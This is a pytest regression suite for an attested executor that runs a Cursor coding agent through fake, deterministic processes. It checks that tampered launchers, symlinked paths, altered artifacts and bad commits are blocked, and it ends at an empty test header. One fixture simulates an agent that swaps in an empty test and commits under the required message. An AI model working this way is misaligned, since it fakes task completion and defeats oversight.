"""Act-2A native executor regressions; every agent process is deterministic fake code."""

from __future__ import annotations

from dataclasses import dataclass, field, replace
import hashlib
import json
import os
from pathlib import Path
import shutil
import stat
import subprocess
import sys
import re
from typing import Callable

import pytest

from admissible.delegated_gate.canonical import fingerprint
from admissible.delegated_gate.native_canary import (
    CANARY_MISSION,
    EXPECTED_MATERIAL_PATHS,
    MAX_AUDITOR_INVOCATIONS,
    MAX_NATIVE_PHASE_ATTEMPTS,
    MAX_PROVIDER_INVOCATIONS,
    MAX_REPAIR_ROUNDS,
    MAX_RETRIES,
    NativeCanaryCoordinator,
    NativeCanaryStatus,
    REQUIRED_COMMIT_MESSAGE,
    build_authorization_payload,
    build_canary_repository,
    build_native_agent_prompt,
    create_canary_session,
    load_behavioral_verifier,
    main,
    run_behavioral_verifier,
    _git_source_preflight,
)
from admissible.delegated_gate.native_executor import (
    ATTESTATION_SCHEMA_VERSION,
    BACKEND_IDENTITY,
    BACKEND_PROTOCOL_VERSION,
    AtomicNativeExecutionStore,
    CursorInstallationProvenance,
    CursorNativeBackendConfig,
    CURSOR_DISCOVERY_COMMAND,
    CURSOR_DISCOVERY_MECHANISM,
    EXPECTED_CURSOR_PACKAGE_NAME,
    NativeBackendAttestation,
    NativeBackendFileAttestation,
    NativeCanaryTerminalRecord,
    NativeCaptureTerminalStatus,
    NativeCommittedButDurabilityUncertain,
    NativeDelegatedExecutor,
    NativeEvidenceInvalid,
    NativeExecutionRequest,
    NativeExecutionResult,
    NativeExecutionStatus,
    NativeFilesystemIdentity,
    NativePreflightDecision,
    NativePreflightStatus,
    NativeProcessInvocation,
    NativeProcessOutcome,
    NativeResultAlreadyExists,
    OBSERVATION_PROVEN_EMPTY,
    preflight_native_cursor,
)
from admissible.delegated_gate.state import Phase
from admissible.delegated_gate.store import AtomicDelegatedSessionStore


def _command(argv: list[str], *, cwd: Path, env: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    return subprocess.run(argv, cwd=cwd, env=env, shell=False, check=True, capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=60)


def _commit(repository: Path, message: str) -> None:
    env = dict(os.environ)
    env.update({"GIT_AUTHOR_NAME": "Deterministic Fake Executor", "GIT_AUTHOR_EMAIL": "fake@invalid.example", "GIT_COMMITTER_NAME": "Deterministic Fake Executor", "GIT_COMMITTER_EMAIL": "fake@invalid.example", "GIT_AUTHOR_DATE": "2026-01-02T00:00:00Z", "GIT_COMMITTER_DATE": "2026-01-02T00:00:00Z"})
    _command(["git", "add", "--all"], cwd=repository); _command(["git", "commit", "--quiet", "-m", message], cwd=repository, env=env)


def _materialize_success(repository: Path) -> None:
    (repository / "src" / "score.js").write_text("""export function normalizeScore(value) {
  if (!Number.isSafeInteger(value) || value < 0) throw new TypeError('score must be a non-negative safe integer');
  return value;
}

export function higherScore(left, right) { return Math.max(normalizeScore(left), normalizeScore(right)); }
export function loadHighScore(storage, key = 'highScore') {
  const raw = storage.getItem(key);
  return raw === null ? 0 : normalizeScore(Number(raw));
}
export function persistHighScore(storage, score, key = 'highScore') {
  const next = higherScore(loadHighScore(storage, key), score);
  storage.setItem(key, String(next));
  return next;
}
""", encoding="utf-8", newline="\n")
    (repository / "src" / "game-state.js").write_text("""import { normalizeScore, persistHighScore } from './score.js';
export function createGameState(storage) { return { score: 0, rounds: 0, highScore: persistHighScore(storage, 0) }; }
export function finishRound(state, score, storage) {
  const normalized = normalizeScore(score);
  return { score: normalized, rounds: state.rounds + 1, highScore: persistHighScore(storage, normalized) };
}
""", encoding="utf-8", newline="\n")
    (repository / "test" / "game-state.test.js").write_text("""import test from 'node:test';
import assert from 'node:assert/strict';
import { createGameState, finishRound } from '../src/game-state.js';
import { createMemoryStorage } from '../src/memory-storage.js';
test('high score persists', () => {
  const storage = createMemoryStorage();
  assert.equal(finishRound(createGameState(storage), 7, storage).highScore, 7);
});
""", encoding="utf-8", newline="\n")
    (repository / "README.md").write_text("# Canary game state\n\nHigh-score persistence is deterministic.\n", encoding="utf-8", newline="\n")
    _commit(repository, REQUIRED_COMMIT_MESSAGE)


def _mutate_without_feature(repository: Path) -> None:
    (repository / "src" / "score.js").write_text((repository / "src" / "score.js").read_text(encoding="utf-8") + "\n// unrelated\n", encoding="utf-8")
    (repository / "src" / "game-state.js").write_text((repository / "src" / "game-state.js").read_text(encoding="utf-8") + "\n// unrelated\n", encoding="utf-8")
    (repository / "test" / "game-state.test.js").write_text("import test from 'node:test'; test('weakened', () => {});\n", encoding="utf-8")
    (repository / "README.md").write_text("# unrelated\n", encoding="utf-8")
    _commit(repository, REQUIRED_COMMIT_MESSAGE)


@dataclass
class FakeNativeProcessRunner:
    mutation: Callable[[Path], None] | None = _materialize_success
    returncode: int | None = 0
    timed_out: bool = False
    cleanup_confirmed: bool = True
    orphan_process_ids: tuple[int, ...] = ()
    stdout: str = "provider prose is non-authoritative\n"
    invocations: list[NativeProcessInvocation] = field(default_factory=list)
    def run(self, invocation: NativeProcessInvocation) -> NativeProcessOutcome:
        self.invocations.append(invocation)
        if self.mutation: self.mutation(Path(invocation.cwd))
        return NativeProcessOutcome(self.returncode, self.stdout, "", self.timed_out, self.cleanup_confirmed, OBSERVATION_PROVEN_EMPTY if self.cleanup_confirmed else "unknown", "hard_timeout" if self.timed_out else "completed", self.orphan_process_ids, len(self.stdout.encode()), 0, False)


class Clock:
    def __init__(self) -> None: self.values=iter(("2026-07-16T10:00:00.000000Z","2026-07-16T10:00:01.000000Z","2026-07-16T10:00:02.000000Z"))
    def __call__(self) -> str: return next(self.values)


@dataclass
class Harness:
    root: Path; source: Path; work: Path; evidence: Path; config: CursorNativeBackendConfig; attestation: object; runner: FakeNativeProcessRunner; store: AtomicNativeExecutionStore; session_store: AtomicDelegatedSessionStore; executor: NativeDelegatedExecutor; coordinator: NativeCanaryCoordinator; session_id: str


def _fake_cursor_launcher(path: Path) -> None:
    path.write_text("""import sys
if '--version' in sys.argv:
 print('Cursor fake 1.0'); raise SystemExit(0)
if '--help' in sys.argv:
 print('--print --force --output-format stream-json --trust --model'); raise SystemExit(0)
raise SystemExit(91)
""", encoding="utf-8")


def _fake_cursor_executable(directory: Path, *, name: str = "cursor-agent-test") -> Path:
    source = Path(sys.executable).resolve()
    executable = directory / f"{name}{source.suffix}"
    shutil.copy2(source, executable)
    return executable


def _test_identity(path: Path) -> NativeFilesystemIdentity:
    return NativeFilesystemIdentity.from_stat(os.lstat(path)).validated()


def _test_attestation(config: CursorNativeBackendConfig, installation: Path) -> NativeBackendAttestation:
    """Explicit injected attestation for deterministic executor tests only.

    It is intentionally never passed to ``preflight_native_cursor``.  The
    production preflight independently requires the host-discovered Cursor
    installation chain, so copied Python and a test launcher cannot acquire
    production-ready status.
    """

    package = installation / "package"
    manifest_path = package / "package.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    relative = manifest["bin"][CURSOR_DISCOVERY_COMMAND]
    launcher = package / relative
    executable = package / "node.exe"
    capability = (installation / "capabilities.txt").read_bytes()
    flags = tuple(sorted(set(re.findall(rb"--[A-Za-z0-9-]+", capability))))
    advertised = tuple(item.decode("ascii") for item in flags)
    required = {"--print", "--force", "--output-format", "--trust", "--model"}
    if not required.issubset(advertised):
        raise ValueError("injected attestation lacks a required advertised argument")
    if str(executable) != config.executable or tuple(config.launcher_prefix) != (str(launcher),):
        raise ValueError("injected test attestation configuration differs from installation")
    provenance = CursorInstallationProvenance(
        discovery_mechanism=CURSOR_DISCOVERY_MECHANISM,
        discovered_shim=NativeBackendFileAttestation.observe(installation / "cursor-agent.cmd", "test shim"),
        installation_root=str(installation),
        installation_root_identity=_test_identity(installation),
        package_root=str(package),
        package_root_identity=_test_identity(package),
        package_manifest=NativeBackendFileAttestation.observe(manifest_path, "test manifest"),
        package_name=EXPECTED_CURSOR_PACKAGE_NAME,
        bin_command=CURSOR_DISCOVERY_COMMAND,
        bin_relative_path=relative,
        launcher=NativeBackendFileAttestation.observe(launcher, "test launcher"),
    ).validated()
    executable_attestation = NativeBackendFileAttestation.observe(executable, "test executable")
    launcher_prefix = (provenance.launcher,)
    argv = (executable_attestation.canonical_path, provenance.launcher.canonical_path)
    version = b"Cursor injected deterministic test runtime\n"
    provisional = NativeBackendAttestation(
        schema_version=ATTESTATION_SCHEMA_VERSION,
        backend_identity=BACKEND_IDENTITY,
        backend_protocol_version=BACKEND_PROTOCOL_VERSION,
        executable=executable_attestation,
        launcher_prefix=launcher_prefix,
        provenance=provenance,
        version_probe_argv=(*argv, "--version"),
        help_probe_argv=(*argv, "--help"),
        version_probe_exit_code=0,
        help_probe_exit_code=0,
        version_stdout_sha256=hashlib.sha256(version).hexdigest(),
        version_stderr_sha256=hashlib.sha256(b"").hexdigest(),
        help_stdout_sha256=hashlib.sha256(capability).hexdigest(),
        help_stderr_sha256=hashlib.sha256(b"").hexdigest(),
        advertised_flags=advertised,
        static_argv_template=(*argv, "--print", "--output-format", "stream-json", "--force", "--trust", "--model", config.model, "{prompt}"),
        selected_model=config.model,
        environment_allowlist=config.environment_allowlist,
        attestation_fingerprint="0" * 64,
    )
    return NativeBackendAttestation(**{**provisional.__dict__, "attestation_fingerprint": fingerprint(provisional._body())}).validated()


def _injected_test_cursor(tmp_path: Path) -> tuple[CursorNativeBackendConfig, Callable[[CursorNativeBackendConfig], NativeBackendAttestation]]:
    installation = tmp_path / "injected-test-installation"
    package = installation / "package"
    package.mkdir(parents=True)
    (installation / "cursor-agent.cmd").write_text("@rem injected test shim\n", encoding="utf-8")
    launcher = package / "index.py"
    _fake_cursor_launcher(launcher)
    executable = _fake_cursor_executable(package, name="node")
    if executable.name != "node.exe":
        executable.rename(package / "node.exe")
    (package / "package.json").write_text(json.dumps({"name": EXPECTED_CURSOR_PACKAGE_NAME, "bin": {CURSOR_DISCOVERY_COMMAND: "index.py"}}), encoding="utf-8")
    (installation / "capabilities.txt").write_text("--print --force --output-format stream-json --trust --model", encoding="utf-8")
    config = CursorNativeBackendConfig(executable=str((package / "node.exe").resolve()), launcher_prefix=(str(launcher.resolve()),))
    return config, lambda configured: _test_attestation(configured, installation)


def _harness(tmp_path: Path, *, runner: FakeNativeProcessRunner | None = None, directory_sync: Callable[[Path], None] | None = None) -> Harness:
    source_parent=tmp_path/"source-parent"; source_parent.mkdir(); source=build_canary_repository(source_parent,repository_name="source").repository
    root=tmp_path/"run"; root.mkdir(); work=build_canary_repository(root).repository; evidence=root/"evidence"; evidence.mkdir()
    config, attestor = _injected_test_cursor(tmp_path)
    attestation = attestor(config)
    fake=runner or FakeNativeProcessRunner(); store=AtomicNativeExecutionStore(evidence/"native-execution",directory_sync=directory_sync or (lambda _: None)); session_store=AtomicDelegatedSessionStore(evidence/"delegated-state")
    session_id="native-canary-session"; session_store.create(create_canary_session(session_id=session_id)); executor=NativeDelegatedExecutor(config=config,process_runner=fake,clock=Clock(),local_attestor=attestor)
    coordinator=NativeCanaryCoordinator(session_store=session_store,execution_store=store,executor=executor,backend_attestation=attestation,source_repository=source,work_workspace=work,canary_parent=root,evidence_directory=evidence,timeout_seconds=30,stdout_byte_limit=4096,stderr_byte_limit=2048)
    return Harness(root,source,work,evidence,config,attestation,fake,store,session_store,executor,coordinator,session_id)


def _request(h: Harness) -> tuple[NativeExecutionRequest,str]:
    state=h.session_store.load(h.session_id); prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work)
    return NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=h.work,evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,attestation=h.attestation,prompt=prompt,timeout_seconds=30,stdout_byte_limit=4096,stderr_byte_limit=2048),prompt


def test_fixture_is_deterministic_clean_one_commit_and_dependency_free(tmp_path: Path):
    left_root=tmp_path/"left"; right_root=tmp_path/"right"; left_root.mkdir(); right_root.mkdir(); left=build_canary_repository(left_root); right=build_canary_repository(right_root)
    assert left.initial_head==right.initial_head and left.initial_material_tree_hash==right.initial_material_tree_hash
    assert _command(["git","status","--porcelain=v1"],cwd=left.repository).stdout==""
    package=json.loads((left.repository/"package.json").read_text(encoding="utf-8")); assert package["scripts"]=={"test":"node --preserve-symlinks --preserve-symlinks-main --test"}; assert "dependencies" not in package


def test_local_attestation_rejects_python_plus_fake_js_launcher(tmp_path: Path):
    fake_js=tmp_path/"fake.js"; _fake_cursor_launcher(fake_js)
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str(Path(sys.executable).resolve()),launcher_prefix=(str(fake_js.resolve()),)))
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED


def test_missing_advertised_flag_blocks_without_provider(tmp_path: Path):
    launcher=tmp_path/"cursor.py"; launcher.write_text("import sys\nprint('--print --force --output-format stream-json --trust')\n",encoding="utf-8")
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str(_fake_cursor_executable(tmp_path).resolve()),launcher_prefix=(str(launcher.resolve()),)))
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED


def test_actual_local_cursor_installation_without_manifest_bin_chain_fails_closed() -> None:
    shim=shutil.which("cursor-agent")
    if shim is None:
        pytest.skip("Cursor Agent is not locally installed")
    installation=Path(shim).resolve().parent
    versions=installation/"versions"
    candidates=sorted((item for item in versions.iterdir() if item.is_dir()),key=lambda item:item.name) if versions.is_dir() else []
    if not candidates or not (candidates[-1]/"node.exe").is_file() or not (candidates[-1]/"index.js").is_file():
        pytest.skip("local Cursor distribution has no inspectable Node runtime layout")
    package=candidates[-1]
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str((package/"node.exe").resolve()),launcher_prefix=(str((package/"index.js").resolve()),)))
    # This local distribution currently declares its runtime package name but
    # no manifest bin mapping.  It must block before any version/help process.
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED
    assert "bin" in decision.detail.lower()


@pytest.mark.parametrize("manifest, launcher_name", [
    ({"name": EXPECTED_CURSOR_PACKAGE_NAME, "bin": {CURSOR_DISCOVERY_COMMAND: "other.py"}}, "index.py"),
    ({"name": EXPECTED_CURSOR_PACKAGE_NAME, "bin": {CURSOR_DISCOVERY_COMMAND: "index.py"}}, "outside.py"),
    ({"name": "cursor-looking-fake", "bin": {CURSOR_DISCOVERY_COMMAND: "index.py"}}, "index.py"),
])
def test_production_preflight_rejects_fake_manifest_and_launcher_chains(tmp_path: Path, manifest: dict[str, object], launcher_name: str):
    package=tmp_path/"fake-package"; package.mkdir(); launcher=package/launcher_name; _fake_cursor_launcher(launcher)
    (package/"package.json").write_text(json.dumps(manifest),encoding="utf-8")
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str(_fake_cursor_executable(package,name="node").resolve()),launcher_prefix=(str(launcher.resolve()),)))
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED


def test_request_round_trip_is_attestation_bound_and_attempt_one_is_rejected(tmp_path: Path):
    h=_harness(tmp_path); request,_=_request(h); assert NativeExecutionRequest.from_dict(json.loads(json.dumps(request.to_dict())))==request
    raw=request.to_dict(); raw["execution_attempt_index"]=1; raw["request_fingerprint"]=fingerprint({key:value for key,value in raw.items() if key!="request_fingerprint"})
    with pytest.raises(ValueError): NativeExecutionRequest.from_dict(raw)


def test_inert_request_parse_needs_fresh_local_attestation_before_execution(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); raw=request.to_dict()
    attestation=raw["backend_attestation"]
    attestation["advertised_flags"]= ["--alternate", "--force", "--model", "--output-format", "--print", "--trust"]
    attestation["attestation_fingerprint"]=fingerprint({key:value for key,value in attestation.items() if key!="attestation_fingerprint"})
    raw["backend_attestation_fingerprint"]=attestation["attestation_fingerprint"]
    raw["request_fingerprint"]=fingerprint({key:value for key,value in raw.items() if key!="request_fingerprint"})
    parsed=NativeExecutionRequest.from_dict(raw)
    with pytest.raises(NativeEvidenceInvalid,match="freshly attested"):
        parsed.validated_for_execution(current_attestation=h.attestation)
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=parsed,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)
    assert h.runner.invocations==[]


def test_substituted_manifest_or_launcher_identity_cannot_reload_as_authority(tmp_path: Path):
    h=_harness(tmp_path); request,_=_request(h); raw=request.to_dict(); manifest=tmp_path/"injected-test-installation"/"package"/"package.json"
    manifest.write_text(json.dumps({"name":"wrong-package","bin":{CURSOR_DISCOVERY_COMMAND:"index.py"}}),encoding="utf-8")
    with pytest.raises(ValueError): NativeExecutionRequest.from_dict(raw)
    # Restore a structurally valid manifest, then prove a changed mapped
    # launcher is likewise rejected before an executor can be entered.
    manifest.write_text(json.dumps({"name":EXPECTED_CURSOR_PACKAGE_NAME,"bin":{CURSOR_DISCOVERY_COMMAND:"index.py"}}),encoding="utf-8")
    Path(h.config.launcher_prefix[0]).write_text("print('substituted launcher')\n",encoding="utf-8")
    with pytest.raises(ValueError): NativeExecutionRequest.from_dict(raw)


def test_changed_launcher_before_spawn_blocks_without_fake_process(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); Path(h.attestation.launcher_prefix[0].canonical_path).write_text("print('changed')\n",encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)
    assert h.runner.invocations==[]


def test_changed_help_capability_evidence_blocks_before_spawn(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h)
    (tmp_path/"injected-test-installation"/"capabilities.txt").write_text("--print --output-format stream-json --trust --model",encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)
    assert h.runner.invocations==[]


def test_changed_copied_executable_after_request_blocks_when_platform_can_launch_copy(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); executable=Path(h.config.executable); executable.write_bytes(executable.read_bytes()+b"x")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)
    assert h.runner.invocations==[]


def test_plain_deserialized_and_lookalike_results_cannot_be_written(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    with pytest.raises(NativeEvidenceInvalid,match="executor-issued"):
        h.store.write_result(object())
    issued=h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)
    result=h.store.write_result(issued); assert result.status is NativeExecutionStatus.PROCESS_SUCCEEDED
    with pytest.raises(NativeEvidenceInvalid): h.store.write_result(issued)
    with pytest.raises(Exception): h.store.create_request(request)


def test_recomputed_contradictory_result_is_rejected(tmp_path: Path):
    h=_harness(tmp_path); outcome=h.coordinator.run(session_id=h.session_id); assert outcome.canary_success
    result=h.store.load_result(h.session_id,"native-canary-gate",0); raw=result.to_dict(); raw["source_tree_hash_after"]="f"*64; raw["source_repository_mutated"]=False
    raw["result_fingerprint"]=fingerprint({key:value for key,value in raw.items() if key!="result_fingerprint"})
    with pytest.raises(ValueError,match="source mutation flag"):
        NativeExecutionResult.from_dict(raw)


@pytest.mark.parametrize(("field", "value", "message"), [
    ("commits_added", 0, "commit count"),
    ("changed_material_files", [], "changed paths"),
    ("final_commit_message", "contradictory message", "final workspace/Git"),
])
def test_self_fingerprinted_git_success_claims_are_recomputed(tmp_path: Path, field: str, value: object, message: str):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    result=h.store.write_result(h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory))
    raw=result.to_dict(); raw[field]=value; raw["result_fingerprint"]=fingerprint({key:item for key,item in raw.items() if key!="result_fingerprint"})
    with pytest.raises(ValueError,match=message): NativeExecutionResult.from_dict(raw)


def test_workspace_git_change_after_result_publication_fails_reloaded_authority(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    h.store.write_result(h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory))
    (h.work/"README.md").write_text("changed after result\n",encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid,match="invalid"):
        h.store.load_result(h.session_id,"native-canary-gate",0)


def test_result_artifact_tamper_and_escape_fail_closed(tmp_path: Path):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success; result=h.store.load_result(h.session_id,"native-canary-gate",0)
    artifact=h.store.directory/result.stdout_artifact.relative_path; artifact.write_bytes(artifact.read_bytes()+b"tamper")
    with pytest.raises(NativeEvidenceInvalid,match="hash"):
        h.store.load_result(h.session_id,"native-canary-gate",0)


def test_symlinked_workspace_and_source_workspace_are_refused(tmp_path: Path):
    h=_harness(tmp_path)
    link=tmp_path/"work-link"
    try: os.symlink(h.work,link,target_is_directory=True)
    except (OSError,NotImplementedError): pytest.skip("symlinks unavailable")
    state=h.session_store.load(h.session_id)
    with pytest.raises(ValueError): NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=link,evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,attestation=h.attestation,prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work),timeout_seconds=30,stdout_byte_limit=10,stderr_byte_limit=10)
    request,prompt=_request(h)
    with pytest.raises(NativeEvidenceInvalid): h.executor.execute(request=request,prompt=prompt,source_repository=h.work,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)


def test_real_windows_junction_workspace_and_evidence_root_are_refused(tmp_path: Path):
    if os.name != "nt": pytest.skip("Windows junction regression")
    h=_harness(tmp_path); junction=tmp_path/"junction"
    completed=subprocess.run(["cmd.exe","/d","/c","mklink","/J",str(junction),str(h.work)],shell=False,capture_output=True)
    if completed.returncode != 0: pytest.skip("junction creation unavailable")
    state=h.session_store.load(h.session_id); prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work)
    with pytest.raises(ValueError): NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=junction,evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,attestation=h.attestation,prompt=prompt,timeout_seconds=30,stdout_byte_limit=10,stderr_byte_limit=10)
    evidence_link=tmp_path/"evidence-junction"; completed=subprocess.run(["cmd.exe","/d","/c","mklink","/J",str(evidence_link),str(h.evidence)],shell=False,capture_output=True)
    if completed.returncode == 0:
        with pytest.raises(ValueError): AtomicNativeExecutionStore(evidence_link/"store",directory_sync=lambda _:None)


def test_redirecting_artifact_destination_blocks_before_fake_process(tmp_path: Path):
    h=_harness(tmp_path); destination=h.store.directory/"redirecting-artifacts"
    try: destination.symlink_to(tmp_path,target_is_directory=True)
    except (OSError,NotImplementedError): pytest.skip("symlinks unavailable")
    request,prompt=_request(h)
    with pytest.raises(ValueError):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=destination)
    assert h.runner.invocations==[]


@pytest.mark.parametrize("kind", ["outside", "sibling", "workspace"])
def test_artifact_root_is_bound_and_rejected_before_request_or_process(tmp_path: Path, kind: str):
    h=_harness(tmp_path); state=h.session_store.load(h.session_id); prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work)
    if kind == "outside":
        artifact=tmp_path/"outside"; artifact.mkdir()
    elif kind == "sibling":
        artifact=h.store.directory.parent/"sibling-artifacts"; artifact.mkdir()
    else:
        artifact=h.work/"agent-artifacts"; artifact.mkdir()
    with pytest.raises((ValueError,NativeEvidenceInvalid)):
        NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=h.work,evidence_store_root=h.store.directory,artifact_directory=artifact,attestation=h.attestation,prompt=prompt,timeout_seconds=30,stdout_byte_limit=1024,stderr_byte_limit=1024)
    assert h.runner.invocations==[]


def test_evidence_root_replacement_blocks_before_fake_process(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    original=h.store.directory; displaced=original.parent/"displaced-native-evidence"; original.rename(displaced); original.mkdir(); (original/"artifacts").mkdir()
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=original,artifact_directory=original/"artifacts")
    assert h.runner.invocations==[]


def test_nested_existing_sibling_mutation_is_detected(tmp_path: Path):
    h=_harness(tmp_path); sibling=h.root/"sibling"; sibling.mkdir(); (sibling/"inside.txt").write_text("before",encoding="utf-8")
    def mutate(work: Path) -> None: _materialize_success(work); (sibling/"inside.txt").write_text("after",encoding="utf-8")
    h.runner.mutation=mutate; outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED and h.session_store.load(h.session_id).phase is Phase.GATE_EXECUTING


def test_directory_durability_uncertainty_blocks_before_provider(tmp_path: Path):
    def fail(_: Path) -> None: raise OSError("directory flush unsupported")
    h=_harness(tmp_path,directory_sync=fail); outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.DURABILITY_UNCERTAIN and h.runner.invocations==[]


def test_behavioral_record_directory_durability_uncertainty_is_visible_and_never_captures(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    calls={"sync":0,"capture":0}
    def sync(_: Path) -> None:
        calls["sync"]+=1
        if calls["sync"] == 6: raise OSError("behavioral record directory fsync failed")
    h=_harness(tmp_path,directory_sync=sync)
    def capture(**kwargs: object) -> object:
        calls["capture"]+=1
        raise AssertionError("checkpoint must not be reached after behavioral durability uncertainty")
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint",capture)
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.DURABILITY_UNCERTAIN and second.status is NativeCanaryStatus.DURABILITY_UNCERTAIN
    assert h.store.has_behavioral_evidence(h.session_id,"native-canary-gate",0) and calls["capture"]==0


@pytest.mark.parametrize("runner,expected",[(FakeNativeProcessRunner(mutation=None,timed_out=True,returncode=None),NativeCanaryStatus.TIMED_OUT),(FakeNativeProcessRunner(mutation=None,returncode=7),NativeCanaryStatus.PROCESS_FAILED),(FakeNativeProcessRunner(mutation=None,cleanup_confirmed=False),NativeCanaryStatus.CLEANUP_UNCERTAIN)])
def test_process_failure_boundaries_create_terminal_without_checkpoint(tmp_path: Path,runner: FakeNativeProcessRunner,expected: NativeCanaryStatus):
    h=_harness(tmp_path,runner=runner); outcome=h.coordinator.run(session_id=h.session_id); assert outcome.status is expected or outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED
    assert h.session_store.load(h.session_id).phase is Phase.GATE_EXECUTING


def test_zero_exit_without_commit_never_captures_checkpoint(tmp_path: Path):
    h=_harness(tmp_path,runner=FakeNativeProcessRunner(mutation=None)); outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED; assert h.session_store.load(h.session_id).checkpoint_history==()


def test_wrong_message_extra_commit_dirty_tree_remote_and_missing_path_all_block_before_checkpoint(tmp_path: Path):
    cases=[]
    def wrong(work: Path) -> None: _materialize_success(work); (work/"README.md").write_text("wrong message\n",encoding="utf-8"); _commit(work,"wrong")
    def extra(work: Path) -> None: _materialize_success(work); (work/"extra.txt").write_text("x",encoding="utf-8"); _commit(work,"extra")
    def dirty(work: Path) -> None: _materialize_success(work); (work/"dirty.txt").write_text("x",encoding="utf-8")
    def remote(work: Path) -> None: _materialize_success(work); _command(["git","remote","add","origin","https://invalid.example/repo.git"],cwd=work)
    def missing(work: Path) -> None: _materialize_success(work); _command(["git","reset","--soft","HEAD~1"],cwd=work); _command(["git","checkout","HEAD","--","README.md"],cwd=work); _commit(work,REQUIRED_COMMIT_MESSAGE)
    for mutation in (wrong,extra,dirty,remote,missing):
        case_root=tmp_path/str(len(cases)); case_root.mkdir()
        h=_harness(case_root,runner=FakeNativeProcessRunner(mutation=mutation)); cases.append(h.coordinator.run(session_id=h.session_id)); assert h.session_store.load(h.session_id).checkpoint_history==()
    assert all(item.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED for item in cases)


def test_mutable_tests_cannot_self_certify_and_behavioral_evidence_is_fingerprinted(tmp_path: Path):
